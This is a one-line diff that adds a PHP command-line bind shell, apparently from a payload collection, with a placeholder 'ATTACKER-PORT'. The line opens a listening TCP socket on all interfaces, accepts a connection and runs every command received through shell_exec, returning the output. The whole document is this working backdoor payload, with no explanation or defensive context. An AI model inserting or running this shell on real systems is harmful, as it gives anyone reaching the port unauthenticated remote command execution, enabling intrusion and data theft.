@@ -1,0 +1,1 @@
+php -r '$sock=socket_create(AF_INET, SOCK_STREAM, SOL_TCP);socket_get_option($sock, SOL_SOCKET, SO_REUSEADDR);socket_bind($sock, "0.0.0.0", ATTACKER-PORT); socket_listen($sock); $c=socket_accept($sock);while(true){$cmd=socket_read($c, 1024);socket_write($c, shell_exec($cmd));}'
